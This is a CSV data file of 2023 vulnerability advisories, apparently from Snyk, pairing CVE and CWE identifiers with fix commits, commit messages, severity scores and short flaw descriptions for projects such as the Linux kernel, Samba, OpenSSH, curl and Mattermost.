CVE-2023-33952,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5808487,28/07/2023,28/07/2023,https://github.com/torvalds/linux/commit/9ef8d83e8e25d5f1811b3a38eb1484f85f64296c,Privilege Escalation,https://api.github.com/repos/torvalds/linux/commits/9ef8d83e8e25d5f1811b3a38eb1484f85f64296c,Zack Rusin,zackr@vmware.com,linux,9ef8d83e8e25d5f1811b3a38eb1484f85f64296c,"drm/vmwgfx: Do not drop the reference to the handle too soon

v3: Fix vmw_user_bo_lookup which was also dropping the gem reference
before the kernel was done with buffer depending on userspace doing
the right thing. Same bug, different spot.

It is possible for userspace to predict the next buffer handle and
to destroy the buffer while it's still used by the kernel. Delay
dropping the internal reference on the buffers until kernel is done
with them.

Instead of immediately dropping the gem reference in vmw_user_bo_lookup
and vmw_gem_object_create_with_handle let the callers decide when they're
ready give the control back to userspace.

Also fixes the second usage of vmw_gem_object_create_with_handle in
vmwgfx_surface.c which wasn't grabbing an explicit reference
to the gem object which could have been destroyed by the userspace
on the owning surface at any point.

Signed-off-by: Zack Rusin <zackr@vmware.com>
Fixes: 8afa13a0583f (""drm/vmwgfx: Implement DRIVER_GEM"")
Reviewed-by: Martin Krastev <krastevm@vmware.com>
Reviewed-by: Maaz Mombasawala <mombasawalam@vmware.com>
Link: https://patchwork.freedesktop.org/patch/msgid/20230211050514.2431155-1-zack@kde.org",C/C++,6.7,medium,Affected versions of this package are vulnerable to Privilege Escalation. A double-free vulnerability was found in the vmwgfx driver in the Linux kernel. The flaw exists within the handling of vmw_buffer_object objects. The issue results from the lack of validating the existence of an object prior to performing further free operations on the object. This flaw allows a local privileged user to escalate privileges and execute code in the context of the kernel.,2023
CVE-2023-32257,CWE-362,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5808486,28/07/2023,28/07/2023,https://github.com/torvalds/linux/commit/f5c779b7ddbda30866cf2a27c63e34158f858c73,Race Condition,https://api.github.com/repos/torvalds/linux/commits/f5c779b7ddbda30866cf2a27c63e34158f858c73,Namjae Jeon,linkinjeon@kernel.org,linux,f5c779b7ddbda30866cf2a27c63e34158f858c73,"ksmbd: fix racy issue from session setup and logoff

This racy issue is triggered by sending concurrent session setup and
logoff requests. This patch does not set connection status as
KSMBD_SESS_GOOD if state is KSMBD_SESS_NEED_RECONNECT in session setup.
And relookup session to validate if session is deleted in logoff.

Cc: stable@vger.kernel.org
Reported-by: zdi-disclosures@trendmicro.com # ZDI-CAN-20481, ZDI-CAN-20590, ZDI-CAN-20596
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,8.1,high,"Affected versions of this package are vulnerable to Race Condition. A flaw was found in the Linux kernel's ksmbd, a high-performance in-kernel SMB server. The specific flaw exists within the processing of SMB2_SESSION_SETUP and SMB2_LOGOFF commands. The issue results from the lack of proper locking when performing operations on an object. An attacker can leverage this vulnerability to execute code in the context of the kernel.",2023
CVE-2023-32248,CWE-476,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5808485,28/07/2023,28/07/2023,https://github.com/torvalds/linux/commit/3ac00a2ab69b34189942afa9e862d5170cdcb018,NULL Pointer Dereference,https://api.github.com/repos/torvalds/linux/commits/3ac00a2ab69b34189942afa9e862d5170cdcb018,Namjae Jeon,linkinjeon@kernel.org,linux,3ac00a2ab69b34189942afa9e862d5170cdcb018,"ksmbd: fix NULL pointer dereference in smb2_get_info_filesystem()

If share is , share->path is NULL and it cause NULL pointer
dereference issue.

Cc: stable@vger.kernel.org
Reported-by: zdi-disclosures@trendmicro.com # ZDI-CAN-20479
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,7.5,high,"Affected versions of this package are vulnerable to NULL Pointer Dereference. A flaw was found in the Linux kernel's ksmbd, a high-performance in-kernel SMB server. The specific flaw exists within the handling of SMB2_TREE_CONNECT and SMB2_QUERY_INFO commands. The issue results from the lack of proper validation of a pointer prior to accessing it. An attacker can leverage this vulnerability to create a denial-of-service condition on the system.",2023
CVE-2023-33951,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5808484,28/07/2023,28/07/2023,https://github.com/torvalds/linux/commit/9ef8d83e8e25d5f1811b3a38eb1484f85f64296c,Information Exposure,https://api.github.com/repos/torvalds/linux/commits/9ef8d83e8e25d5f1811b3a38eb1484f85f64296c,Zack Rusin,zackr@vmware.com,linux,9ef8d83e8e25d5f1811b3a38eb1484f85f64296c,"drm/vmwgfx: Do not drop the reference to the handle too soon

v3: Fix vmw_user_bo_lookup which was also dropping the gem reference
before the kernel was done with buffer depending on userspace doing
the right thing. Same bug, different spot.

It is possible for userspace to predict the next buffer handle and
to destroy the buffer while it's still used by the kernel. Delay
dropping the internal reference on the buffers until kernel is done
with them.

Instead of immediately dropping the gem reference in vmw_user_bo_lookup
and vmw_gem_object_create_with_handle let the callers decide when they're
ready give the control back to userspace.

Also fixes the second usage of vmw_gem_object_create_with_handle in
vmwgfx_surface.c which wasn't grabbing an explicit reference
to the gem object which could have been destroyed by the userspace
on the owning surface at any point.

Signed-off-by: Zack Rusin <zackr@vmware.com>
Fixes: 8afa13a0583f (""drm/vmwgfx: Implement DRIVER_GEM"")
Reviewed-by: Martin Krastev <krastevm@vmware.com>
Reviewed-by: Maaz Mombasawala <mombasawalam@vmware.com>
Link: https://patchwork.freedesktop.org/patch/msgid/20230211050514.2431155-1-zack@kde.org",C/C++,6.7,medium,Affected versions of this package are vulnerable to Information Exposure. A race condition vulnerability was found in the vmwgfx driver in the Linux kernel. The flaw exists within the handling of GEM objects. The issue results from improper locking when performing operations on an object. This flaw allows a local privileged user to disclose information in the context of the kernel.,2023
CVE-2023-32252,CWE-476,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5808482,28/07/2023,28/07/2023,https://github.com/torvalds/linux/commit/f5c779b7ddbda30866cf2a27c63e34158f858c73,NULL Pointer Dereference,https://api.github.com/repos/torvalds/linux/commits/f5c779b7ddbda30866cf2a27c63e34158f858c73,Namjae Jeon,linkinjeon@kernel.org,linux,f5c779b7ddbda30866cf2a27c63e34158f858c73,"ksmbd: fix racy issue from session setup and logoff

This racy issue is triggered by sending concurrent session setup and
logoff requests. This patch does not set connection status as
KSMBD_SESS_GOOD if state is KSMBD_SESS_NEED_RECONNECT in session setup.
And relookup session to validate if session is deleted in logoff.

Cc: stable@vger.kernel.org
Reported-by: zdi-disclosures@trendmicro.com # ZDI-CAN-20481, ZDI-CAN-20590, ZDI-CAN-20596
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,7.5,high,"Affected versions of this package are vulnerable to NULL Pointer Dereference. A flaw was found in the Linux kernel's ksmbd, a high-performance in-kernel SMB server. The specific flaw exists within the handling of SMB2_LOGOFF commands. The issue results from the lack of proper validation of a pointer prior to accessing it. An attacker can leverage this vulnerability to create a denial-of-service condition on the system.",2023
CVE-2023-3750,CWE-667,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-LIBVIRT-5798521,21/07/2023,18/07/2023,https://github.com/libvirt/libvirt/commit/9a47442366fcf8a7b6d7422016d7bbb6764a1098,Improper Locking,https://api.github.com/repos/libvirt/libvirt/commits/9a47442366fcf8a7b6d7422016d7bbb6764a1098,Peter Krempa,pkrempa@redhat.com,libvirt,9a47442366fcf8a7b6d7422016d7bbb6764a1098,"storage: Fix returning of locked objects from 'virStoragePoolObjListSearch'

CVE-2023-3750

'virStoragePoolObjListSearch' explicitly documents that it's returning
a pointer to a locked and ref'd pool that maches the lookup function.

This was not the case as in commit 0c4b391e2a9 (released in
libvirt-8.3.0) the code was accidentally converted to use 'VIR_LOCK_GUARD'
which auto-unlocked it when leaving the scope, even when the code was
originally ""leaking"" the lock.

Revert the corresponding conversion and add a comment that this function
is intentionally leaking a locked object.

Fixes: 0c4b391e2a9
Resolves: https://bugzilla.redhat.com/show_bug.cgi?id=2221851
Signed-off-by: Peter Krempa <pkrempa@redhat.com>
Reviewed-by: Ján Tomko <jtomko@redhat.com>",C/C++,6.5,medium,"Affected versions of this package are vulnerable to Improper Locking in virStoragePoolObjListSearch which may lead to denial of service.
Note:
The versions of libvirt as shipped with Red Hat Enterprise Linux 6, 7 and 8 are not affected by this flaw as they did not include the unlocking refactor that introduced the bug.",2023
CVE-2023-0160,CWE-833,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5798541,21/07/2023,21/07/2023,https://github.com/torvalds/linux/commit/ed17aa92dc56b6d8883e4b7a8f1c6fbf5ed6cd29,Deadlock,https://api.github.com/repos/torvalds/linux/commits/ed17aa92dc56b6d8883e4b7a8f1c6fbf5ed6cd29,Xin Liu,liuxin350@huawei.com,linux,ed17aa92dc56b6d8883e4b7a8f1c6fbf5ed6cd29,"bpf, sockmap: fix deadlocks in the sockhash and sockmap

When huang uses sched_switch tracepoint, the tracepoint
does only one thing in the mounted ebpf program, which
deletes the fixed elements in sockhash ([0])

It seems that elements in sockhash are rarely actively
deleted by users or ebpf program. Therefore, we do not
pay much attention to their deletion. Compared with hash
maps, sockhash only provides spin_lock_bh protection.
This causes it to appear to have self-locking behavior
in the interrupt context.

  [0]:https://lore.kernel.org/all/CABcoxUayum5oOqFMMqAeWuS8+EzojquSOSyDA3J_2omY=2EeAg@mail.gmail.com/

Reported-by: Hsin-Wei Hung <hsinweih@uci.edu>
Fixes: 604326b41a6f (""bpf, sockmap: convert to generic sk_msg interface"")
Signed-off-by: Xin Liu <liuxin350@huawei.com>
Acked-by: John Fastabend <john.fastabend@gmail.com>
Link: https://lore.kernel.org/r/20230406122622.109978-1-liuxin350@huawei.com
Signed-off-by: Alexei Starovoitov <ast@kernel.org>",C/C++,4.7,medium,Affected versions of this package are vulnerable to Deadlock in the Linux kernel’s BPF subsystem. This flaw allows a local user to potentially crash the system.,2023
CVE-2023-34966,CWE-835,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SAMBA-5798519,21/07/2023,19/07/2023,https://github.com/samba-team/samba/commit/cb6f3e2202473eeccf81e34ebcdb4bc4f726548a,Infinite loop,https://api.github.com/repos/samba-team/samba/commits/cb6f3e2202473eeccf81e34ebcdb4bc4f726548a,Ralph Boehme,slow@samba.org,samba,cb6f3e2202473eeccf81e34ebcdb4bc4f726548a,"CVE-2023-34966: mdssvc: harden sl_unpack_loop()

A malicious client could send a packet where subcount is zero, leading to a busy
loop because

    count -= subcount
=>  count -= 0
=>  while (count > 0)

loops forever.

BUG: https://bugzilla.samba.org/show_bug.cgi?id=15340

Signed-off-by: Ralph Boehme <slow@samba.org>",C/C++,7.5,high,"Affected versions of this package are vulnerable to Infinite loop. When parsing Spotlight mdssvc RPC packets sent by the client, the core unmarshalling function sl_unpack_loop() does not validate a field in the network packet that contains the count of elements in an array-like structure. By passing 0 as the count value, the attacked function will run in an endless loop consuming 100% CPU. This flaw allows an attacker to issue a malformed RPC request, triggering an infinite loop, resulting in a denial of service condition.",2023
CVE-2023-34967,CWE-843,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SAMBA-5798520,21/07/2023,19/07/2023,https://github.com/samba-team/samba/commit/5b4353cc60b75610f0aa12b1cced36d35a4d04d4,Access of Resource Using Incompatible Type ('Type Confusion'),https://api.github.com/repos/samba-team/samba/commits/5b4353cc60b75610f0aa12b1cced36d35a4d04d4,Ralph Boehme,slow@samba.org,samba,5b4353cc60b75610f0aa12b1cced36d35a4d04d4,"CVE-2023-34967: mdssvc: add type checking to dalloc_value_for_key()

Change the dalloc_value_for_key() function to require an additional final
argument which denotes the expected type of the value associated with a key. If
the types don't match, return NULL.

BUG: https://bugzilla.samba.org/show_bug.cgi?id=15341

Signed-off-by: Ralph Boehme <slow@samba.org>",C/C++,5.3,medium,"Affected versions of this package are vulnerable to Access of Resource Using Incompatible Type ('Type Confusion'). When parsing Spotlight mdssvc RPC packets, one encoded data structure is a key-value style dictionary where the keys are character strings, and the values can be any of the supported types in the mdssvc protocol. Due to a lack of type checking in callers of the dalloc_value_for_key() function, which returns the object associated with a key, a caller may trigger a crash in talloc_get_size() when talloc detects that the passed-in pointer is not a valid talloc pointer. With an RPC worker process shared among multiple client connections, a malicious client or attacker can trigger a process crash in a shared RPC mdssvc worker process, affecting all other clients this worker serves.",2023
CVE-2023-3347,CWE-287,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SAMBA-5798518,21/07/2023,19/07/2023,https://github.com/samba-team/samba/commit/6be7bd40f0afb0fc5dd53f89120b867a72dd484f,Improper Authentication,https://api.github.com/repos/samba-team/samba/commits/6be7bd40f0afb0fc5dd53f89120b867a72dd484f,Ralph Boehme,slow@samba.org,samba,6be7bd40f0afb0fc5dd53f89120b867a72dd484f,"CVE-2023-3347: smbd: inline smb2_srv_init_signing() code in srv_init_signing()

It's now a one-line function, imho the overall code is simpler if that code is
just inlined.

BUG: https://bugzilla.samba.org/show_bug.cgi?id=15397

Signed-off-by: Ralph Boehme <slow@samba.org>",C/C++,5.9,medium,"Affected versions of this package are vulnerable to Improper Authentication. The SMB2 packet signing is not enforced if an admin configured server signing = required or for SMB2 connections to Domain Controllers where SMB2 packet signing is mandatory. This flaw allows an attacker to perform attacks, such as a man-in-the-middle attack, by intercepting the network traffic and modifying the SMB2 messages between client and server, affecting the integrity of the data.",2023
CVE-2023-34968,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SAMBA-5798517,21/07/2023,19/07/2023,https://github.com/samba-team/samba/commit/1809843614bbd407db221ace2c90faf9259065b0,Information Exposure,https://api.github.com/repos/samba-team/samba/commits/1809843614bbd407db221ace2c90faf9259065b0,Ralph Boehme,slow@samba.org,samba,1809843614bbd407db221ace2c90faf9259065b0,"CVE-2023-34968: mdssvc: return a fake share path

Instead of returning the real server-side absolute path of shares and search
results, return a fake absolute path replacing the path of the share with the
share name, iow for a share ""test"" with a server-side path of ""/foo/bar"", we
previously returned

  /foo/bar and
  /foo/bar/search/result

and now return

  /test and
  /test/search/result

BUG: https://bugzilla.samba.org/show_bug.cgi?id=15388

Signed-off-by: Ralph Boehme <slow@samba.org>
Reviewed-by: Stefan Metzmacher <metze@samba.org>",C/C++,5.3,medium,"Affected versions of this package are vulnerable to Information Exposure. As part of the Spotlight protocol, Samba discloses the server-side absolute path of shares, files, and directories in the results for search queries. This flaw allows a malicious client or an attacker with a targeted RPC request to view the information that is part of the disclosed path.",2023
CVE-2022-2127,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SAMBA-5798516,21/07/2023,19/07/2023,https://github.com/samba-team/samba/commit/5c6fe5a491b16bb658c191cfafb5edc0beb5fab2,Out-of-bounds Read,https://api.github.com/repos/samba-team/samba/commits/5c6fe5a491b16bb658c191cfafb5edc0beb5fab2,Volker Lendecke,vl@samba.org,samba,5c6fe5a491b16bb658c191cfafb5edc0beb5fab2,"CVE-2022-2127: winbindd: Fix WINBINDD_PAM_AUTH_CRAP length checks

With WBFLAG_BIG_NTLMV2_BLOB being set plus lm_resp_len too large you
can crash winbind. We don't independently check lm_resp_len
sufficiently.

Discovered via Coverity ID 1504444 Out-of-bounds access

BUG: https://bugzilla.samba.org/show_bug.cgi?id=15072

Signed-off-by: Volker Lendecke <vl@samba.org>",C/C++,5.9,medium,"Affected versions of this package are vulnerable to Out-of-bounds Read due to insufficient length checks in the winbindd_pam_auth_crap.c file. When performing NTLM authentication, the client replies to cryptographic challenges back to the server. These replies have variable lengths, and Winbind fails to check the lan manager response length. When Winbind is used for NTLM authentication, a maliciously crafted request can trigger an out-of-bounds read in Winbind, possibly resulting in a crash.",2023
CVE-2023-38408,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-OPENSSHPORTABLE-5798515,21/07/2023,19/07/2023,https://github.com/openssh/openssh-portable/commit/b23fe83f06ee7e721033769cfa03ae840476d280,Arbitrary Code Injection,https://api.github.com/repos/openssh/openssh-portable/commits/b23fe83f06ee7e721033769cfa03ae840476d280,Damien Miller,djm@mindrot.org,openssh-portable,b23fe83f06ee7e721033769cfa03ae840476d280,terminate pkcs11 process for bad libraries,C/C++,7.3,high,"Affected versions of this package are vulnerable to Arbitrary Code Injection. The PKCS#11 feature in ssh-agent in OpenSSH has an insufficiently trustworthy search path, leading to remote code execution if an agent is forwarded to an attacker-controlled system.
Note:
This issue exists because of an incomplete fix for CVE-2016-10009.",2023
CVE-2021-34119,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-MICHAELRSWEETHTMLDOC-5798514,21/07/2023,21/07/2023,https://github.com/michaelrsweet/htmldoc/commit/85fa76d77ed69927d24decf476e69bedc7691f48,Denial of Service (DoS),https://api.github.com/repos/michaelrsweet/htmldoc/commits/85fa76d77ed69927d24decf476e69bedc7691f48,Michael R Sweet,michael.r.sweet@gmail.com,htmldoc,85fa76d77ed69927d24decf476e69bedc7691f48,Fix another crash bug with bogus data (Issue #431),Markdown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS) via the parse_paragraph function in the ps-pdf.cxx file, by using a crafted file.",2023
CVE-2021-34119,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-MICHAELRSWEETHTMLDOC-5798513,21/07/2023,21/07/2023,https://github.com/michaelrsweet/htmldoc/commit/85fa76d77ed69927d24decf476e69bedc7691f48,Denial of Service (DoS),https://api.github.com/repos/michaelrsweet/htmldoc/commits/85fa76d77ed69927d24decf476e69bedc7691f48,Michael R Sweet,michael.r.sweet@gmail.com,htmldoc,85fa76d77ed69927d24decf476e69bedc7691f48,Fix another crash bug with bogus data (Issue #431),Markdown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS) via the parse_paragraph function in the ps-pdf.cxx file, by using a crafted file.",2023
CVE-2022-41409,CWE-190,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-PCRE2PROJECTPCRE2-5798512,21/07/2023,21/07/2023,https://github.com/PCRE2Project/pcre2/commit/94e1c001761373b7d9450768aa15d04c25547a35,Integer Overflow or Wraparound,https://api.github.com/repos/PCRE2Project/pcre2/commits/94e1c001761373b7d9450768aa15d04c25547a35,Philip Hazel,Philip.Hazel@gmail.com,pcre2,94e1c001761373b7d9450768aa15d04c25547a35,Diagnose negative repeat value in pcre2test subject line,Unknown,7.6,high,Affected versions of this package are vulnerable to Integer Overflow or Wraparound allowing attackers to cause a denial of service or other unspecified impacts via negative input.,2023
CVE-2023-32001,CWE-367,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-CURL-5798510,21/07/2023,19/07/2023,https://github.com/curl/curl/commit/0c667188e0c6cda615a0,Time-of-check Time-of-use (TOCTOU) Race Condition,https://api.github.com/repos/curl/curl/commits/0c667188e0c6cda615a0,SaltyMilk,soufiane.elmelcaoui@gmail.com,curl,0c667188e0c6cda615a036b8a2b4125f2c404dde,"fopen: optimize

Closes #11419",C/C++,5.5,medium,"curl is a command line tool and library for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP. libcurl offers a myriad of powerful features.
Affected versions of this package are vulnerable to Time-of-check Time-of-use (TOCTOU) Race Condition. This race condition modifies the behavior of symbolic link files in affected components which might be followed instead of overwritten when the condition is met, leading to undesired and potentially destructive behavior.
Note:
This issue does not affect the Curl package as shipped in Red Hat Enterprise Linux 6, 7, 8, and 9.",2023
CVE-2020-24275,CWE-644,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SWOOLESWOOLESRC-5798509,21/07/2023,21/07/2023,https://github.com/swoole/swoole-src/commit/4bab1a2403adcbf97104ea81a521987f77d32790,HTTP Header Injection,https://api.github.com/repos/swoole/swoole-src/commits/4bab1a2403adcbf97104ea81a521987f77d32790,codinghuang,2812240764@qq.com,swoole-src,4bab1a2403adcbf97104ea81a521987f77d32790,"Fixed: check cookie injection (#3545)

* Fixed: check cookie injection

* fix: don't check crlf when use cookie urlencode",C/C++,5.3,medium,Affected versions of this package are vulnerable to HTTP Header Injection allowing attackers to execute arbitrary code by supplying a crafted URL.,2023
CVE-2023-37650,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-PHP-COCKPITHQCOCKPIT-5798507,21/07/2023,21/07/2023,https://github.com/Cockpit-HQ/Cockpit/commit/ef00d03ea1d50921976c3f163fc89bce6e813e9a,Cross-site Request Forgery (CSRF),https://api.github.com/repos/Cockpit-HQ/Cockpit/commits/ef00d03ea1d50921976c3f163fc89bce6e813e9a,Artur Heinze,artur@agentejo.com,Cockpit,ef00d03ea1d50921976c3f163fc89bce6e813e9a,Add csrf token validation to internal api calls to improve security (thanks @Ccamm),Markdown,4.3,medium,Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) allowing attackers to execute arbitrary Administrator commands.,2023
CVE-2023-37471,CWE-287,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGOPENIDENTITYPLATFORMOPENAM-5798505,21/07/2023,21/07/2023,https://github.com/OpenIdentityPlatform/OpenAM/commit/7c18543d126e8a567b83bb4535631825aaa9d742,Improper Authentication,https://api.github.com/repos/OpenIdentityPlatform/OpenAM/commits/7c18543d126e8a567b83bb4535631825aaa9d742,Maxim Thomas,maxim.thomas@gmail.com,OpenAM,7c18543d126e8a567b83bb4535631825aaa9d742,"GHSL-2023-143, GHSL-2023-144, deny unsigned SAML response (#624)",Java,9.1,critical,"Affected versions of this package are vulnerable to Improper Authentication due to not properly validating the signature of SAML responses received as part of the SAMLv1.x Single Sign-On process. Attackers can use this fact to impersonate any OpenAM user, including the administrator, by sending a specially crafted SAML response to the SAMLPOSTProfileServlet servlet.",2023
CVE-2018-14657,CWE-307,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-5798491,21/07/2023,13/05/2022,https://github.com/keycloak/keycloak/commit/ddbef683fb48421a42ed3abc3d486d1eded54735,Brute Force,https://api.github.com/repos/keycloak/keycloak/commits/ddbef683fb48421a42ed3abc3d486d1eded54735,Martin Kanis,mkanis@redhat.com,keycloak,ddbef683fb48421a42ed3abc3d486d1eded54735,KEYCLOAK-8125,Java,8.1,high,"Affected versions of this package are vulnerable to Brute Force. When TOPT is enabled, an improper implementation of the Brute Force detection algorithm will not enforce its protection measures.",2023
CVE-2023-3585,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMATTERMOSTMATTERMOSTSERVER-5798489,21/07/2023,21/07/2023,https://github.com/mattermost/mattermost/commit/1b61e43a4abf085696e418530f0a32d4572712c7,Denial of Service (DoS),https://api.github.com/repos/mattermost/mattermost/commits/1b61e43a4abf085696e418530f0a32d4572712c7,Vishal,vish@mattermost.com,mattermost,1b61e43a4abf085696e418530f0a32d4572712c7,"Manual cherry pick of [MM-52527] (#23519) (#23675)

Automatic Merge",Go,4.3,medium,"github.com/mattermost/mattermost-server is an open source Slack-alternative in Golang and React.
Affected versions of this package are vulnerable to Denial of Service (DoS) by posting a specially crafted boards link.",2023
CVE-2020-26211,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SSDDANBROWNBOOKSTACK-5798488,21/07/2023,24/05/2022,https://github.com/BookStackApp/BookStack/commit/bbd1384acbe7e52c21f89af69f2dc391c95dbf54,Cross-site Scripting (XSS),https://api.github.com/repos/BookStackApp/BookStack/commits/bbd1384acbe7e52c21f89af69f2dc391c95dbf54,PercussiveElbow,PercussiveElbow@users.noreply.github.com,BookStack,bbd1384acbe7e52c21f89af69f2dc391c95dbf54,XSS and redirect fixes with test cases,PHP,6.1,medium,"ssddanbrown/bookstack is a BookStack documentation platform
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization. A user with permissions to edit a page could insert JavaScript code through the use of javascript: URIs within a link or form which would run, within the context of the current page, when clicked or submitted. Additionally, a user with permissions to edit a page could insert a particular meta tag which could be used to silently redirect users to a alternative location upon visit of a page. Dangerous content may remain in the database but will be removed before being displayed on a page.",2023
CVE-2023-3581,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMATTERMOSTMATTERMOSTSERVERAPP-5798487,21/07/2023,21/07/2023,https://github.com/mattermost/mattermost/commit/14a812299375885c547646ca720313a9d840228b,Access Restriction Bypass,https://api.github.com/repos/mattermost/mattermost/commits/14a812299375885c547646ca720313a9d840228b,Agniva De Sarker,agnivade@yahoo.co.in,mattermost,14a812299375885c547646ca720313a9d840228b,"MM-52898: WS fix (#23489) (#23658)

Automatic Merge",Go,6.5,medium,"github.com/mattermost/mattermost-server/app is an open source Slack-alternative in Golang and React.
Affected versions of this package are vulnerable to Access Restriction Bypass due to failing to properly validate the origin of a websocket connection from an attacker in a MITM position.",2023
CVE-2023-37649,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PHP-COCKPITHQCOCKPIT-5798486,21/07/2023,21/07/2023,https://github.com/Cockpit-HQ/Cockpit/commit/26b38c07c3899d3e0123c92e045c13cee008d966,Information Exposure,https://api.github.com/repos/Cockpit-HQ/Cockpit/commits/26b38c07c3899d3e0123c92e045c13cee008d966,Artur Heinze,artur@agentejo.com,Cockpit,26b38c07c3899d3e0123c92e045c13cee008d966,Fix possible content `models` permission naming collision #111,Markdown,5.3,medium,Affected versions of this package are vulnerable to Information Exposure in the /models/Content component which allows unauthorized attackers to access to sensitive data.,2023
CVE-2023-3582,CWE-863,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMATTERMOSTMATTERMOSTPLUGINWELCOMEBOTSERVER-5798485,21/07/2023,21/07/2023,https://github.com/mattermost/mattermost-plugin-welcomebot/commit/a6fd7df9c010132c925978287e27dc14d8a6bf73,Incorrect Authorization,https://api.github.com/repos/mattermost/mattermost-plugin-welcomebot/commits/a6fd7df9c010132c925978287e27dc14d8a6bf73,Claudio Costa,cstcld91@gmail.com,mattermost-plugin-welcomebot,a6fd7df9c010132c925978287e27dc14d8a6bf73,"Restrict channel invitations to non-guest accounts (#90)

* Restrict channel invitations to non-guest accounts

* Update server/configuration.go

Co-authored-by: Jason Frerich <jason.frerich@mattermost.com>

Co-authored-by: Jason Frerich <jason.frerich@mattermost.com>",Markdown,4.3,medium,"github.com/mattermost/mattermost-plugin-welcomebot/server is a Mattermost Welcome Bot plugin that helps welcome users to teams and/or channels
Affected versions of this package are vulnerable to Incorrect Authorization when linking a board to a channel, which allows a low-privileged user to link a Board to a private channel they don't have access to,",2023
CVE-2023-37276,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-AIOHTTP-5798483,21/07/2023,20/07/2023,https://github.com/aio-libs/aiohttp/commit/9337fb3f2ab2b5f38d7e98a194bde6f7e3d16c40,HTTP Request Smuggling,https://api.github.com/repos/aio-libs/aiohttp/commits/9337fb3f2ab2b5f38d7e98a194bde6f7e3d16c40,Sam Bull,git@sambull.org,aiohttp,9337fb3f2ab2b5f38d7e98a194bde6f7e3d16c40,"Fix bump llhttp to v8.1.1 (#7367) (#7377)

(cherry picked from commit 41e2c4c1fdf34d800bb9e4247cd9ebfc6904d9d7)",Unknown,5.3,medium,"Affected versions of this package are vulnerable to HTTP Request Smuggling in that aiohttp is bundled with llhttp v6.0.6, which is vulnerable to CVE-2023-30589. The vulnerable code is used by aiohttp for its HTTP request parser, when available, which is the default case when installing from a wheel.
Note
This vulnerability only affects users of aiohttp as an HTTP server (i.e. aiohttp.Application). Users are not affected by this vulnerability if they use aiohttp as an HTTP client library (i.e. aiohttp.ClientSession).",2023
CVE-2023-3614,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMATTERMOSTMATTERMOSTSERVER-5798043,20/07/2023,20/07/2023,https://github.com/mattermost/mattermost/commit/195b03d379d70e6c772f7aded718e134c4b58b3b,Denial of Service (DoS),https://api.github.com/repos/mattermost/mattermost/commits/195b03d379d70e6c772f7aded718e134c4b58b3b,Agniva De Sarker,agnivade@yahoo.co.in,mattermost,195b03d379d70e6c772f7aded718e134c4b58b3b,"MM-52720: use an io.LimitedReader in gif frame counting (#23372) (#23712)

Automatic Merge",Unknown,4.3,medium,"github.com/mattermost/mattermost-server is an open source Slack-alternative in Golang and React.
Affected versions of this package are vulnerable to Denial of Service (DoS) by failing to properly validate a linked GIF image file, thus consuming excessive resources and making the server unresponsive.",2023
CVE-2023-3577,CWE-918,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMATTERMOSTMATTERMOSTSERVERAPP-5798045,20/07/2023,20/07/2023,https://github.com/mattermost/mattermost/commit/8440d93b98e7fc3e817d4256871d83c92da35105,Server-side Request Forgery (SSRF),https://api.github.com/repos/mattermost/mattermost/commits/8440d93b98e7fc3e817d4256871d83c92da35105,Agniva De Sarker,agnivade@yahoo.co.in,mattermost,8440d93b98e7fc3e817d4256871d83c92da35105,"MM-37691: Harden interactive dialog action (#22783) (#23657)

Automatic Merge",Go,3.5,low,"github.com/mattermost/mattermost-server/app is an open source Slack-alternative in Golang and React.
Affected versions of this package are vulnerable to Server-side Request Forgery (SSRF) via requests to localhost/intranet using an interactive dialog.",2023
